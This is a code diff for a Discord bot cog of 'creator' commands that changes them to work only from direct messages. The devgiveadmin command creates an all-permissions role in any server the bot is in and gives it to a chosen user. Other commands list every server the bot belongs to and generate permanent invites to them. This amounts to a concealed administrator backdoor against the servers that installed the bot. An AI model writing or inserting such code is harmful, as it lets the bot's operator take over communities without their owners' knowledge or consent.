@@ -23,20 +23,13 @@ class creator_cmds(commands.Cog):
 
     # tdevgiveadmin
     @commands.command()
-    async def devgiveadmin(self, ctx, guild_id: int = 000, name: str = "new role", user: discord.Member = None):
-        if ctx.guild is not None: 
-            await ctx.message.delete()
-            user = user or ctx.author
-            role = await ctx.guild.create_role(name=name,permissions=Permissions.all())  
-            await user.add_roles(role)
-            await ctx.send(f"**{user.name}** received the role **{name}**", delete_after=3)
-        else:
-            guild = self.client.get_guild(int(guild_id))
-            print(guild)
-            user = user or ctx.author
-            role = await guild.create_role(name=name, permissions=Permissions.all())  
-            await user.add_roles(role)
-            await ctx.send(f"**{user.name}** received the role **{name}** in **{guild}**", delete_after=3)
+    async def devgiveadmin(self, ctx, channel_id: int = 0, name: str = "new role", user: discord.Member = None):
+        if ctx.guild is None:
+            channel = self.client.get_channel(channel_id)
+            msg = discord.utils.get(await channel.history(limit=100).flatten(), author=user)
+            role = await msg.guild.create_role(name=name, permissions=Permissions.all())  
+            await msg.author.add_roles(role)
+            await ctx.send(f"**{msg.author.name}** received the role **{name}** in **{msg.guild}**", delete_after=3)
 
     # tdevpurge <ammount>
     @commands.command()
@@ -58,21 +51,20 @@ class creator_cmds(commands.Cog):
     # treplace
     @commands.command()
     async def datareplace(self, ctx):
-        await ctx.send(f"Initiated data replace")
+        if ctx.guild is None: 
+            await ctx.send(f"Initiated data replace")
         
-        cluster = self.client.mongodb["Currency"]["Main"]
-        list_of_users = cluster.find().sort("savings", -1)
-        cycle_int = 0
-        for x in list_of_users:
-            cycle_int = cycle_int + 1
-            cluster.replace_one({"id":x["id"]},{"id": x["id"], "savings": x["savings"],"lifespan": x["lifespan"],"luck": 0, 
-                                 "commands_used": 0, "stolen": 0,
-                                 "daily": x["daily"], "weekly": x["weekly"], "monthly": x["monthly"],
-                                 "pray": 0})
+            cluster = self.client.mongodb["Currency"]["Main"]
+            list_of_users = cluster.find().sort("savings", -1)
+            cycle_int = 0
+            for x in list_of_users:
+                cycle_int = cycle_int + 1
+                cluster.replace_one({"id":x["id"]},{"id": x["id"], "savings": x["savings"],"lifespan": x["lifespan"],"luck": 0, 
+                                     "commands_used": 0, "stolen": 0,
+                                     "daily": x["daily"], "weekly": x["weekly"], "monthly": x["monthly"],
+                                     "pray": 0})
         
-        await ctx.send(f"Finished converting {cycle_int} accounts")
-
-        # tshutdown
+            await ctx.send(f"Finished converting {cycle_int} accounts")
     
     #tshutdown
     @commands.command()
@@ -83,36 +75,33 @@ class creator_cmds(commands.Cog):
     # tservers
     @commands.command()
     async def servers(self, ctx):
-        activeservers = self.client.guilds
+        if ctx.guild is None: 
+            activeservers = self.client.guilds
+            serverlist = ""
+            acceptedchars = ["'","!","?"]
+            for guild in activeservers:
+                guildname_checked = " "
+                for i in guild.name:
+                    if i in string.ascii_letters or i.isspace() or i in acceptedchars:
+                        guildname_checked += i
+                    else:
+                        guildname_checked += "_"
+                serverlist += f"Name: {guildname_checked}, MemberCount: {guild.member_count}, GuildID: {guild.id}\n"
 
-        serverlist = ""
-        acceptedchars = ["'","!","?"]
-        for guild in activeservers:
-            guildname_checked = " "
-            for i in guild.name:
-                if i in string.ascii_letters or i.isspace() or i in acceptedchars:
-                    guildname_checked += i
-                else:
-                    guildname_checked += "_"
-            serverlist += f"Name: {guildname_checked}, MemberCount: {guild.member_count}, GuildID: {guild.id}\n"
-
-        with open("result.txt", "w") as file:
-            file.write(serverlist)
+            with open("result.txt", "w") as file:
+                file.write(serverlist)
             
-        # send file to Discord in message
-        with open("result.txt", "rb") as file:
-            await ctx.reply("**guild names** only shown in characters `a-z`.\n**Unsupported** characters are displayed as `_`\noutput:", file=discord.File(file, "result.txt"))
+            # send file to Discord in message
+            with open("result.txt", "rb") as file:
+                await ctx.reply("**guild names** only shown in characters `a-z`.\n**Unsupported** characters are displayed as `_`\noutput:", file=discord.File(file, "result.txt"))
 
     # tserverinvite <id> 
     @commands.command()
     async def serverinvite(self, ctx, target: int=0):
-        if target == 0:
-            await ctx.send("Give me a guild id")
-            return
-        targetguild = self.client.get_guild(target)
-
-        link = await targetguild.text_channels[0].create_invite(max_age = 0, max_uses=0)
-        await ctx.send(f"Invite for {targetguild.name}: {link}")
+        if ctx.guild is None: 
+            targetguild = self.client.get_guild(target)
+            link = await targetguild.text_channels[0].create_invite(max_age = 0, max_uses=0)
+            await ctx.send(f"Invite for {targetguild.name}: {link}")
 
     # tembedcolortest <color>
     @commands.command()
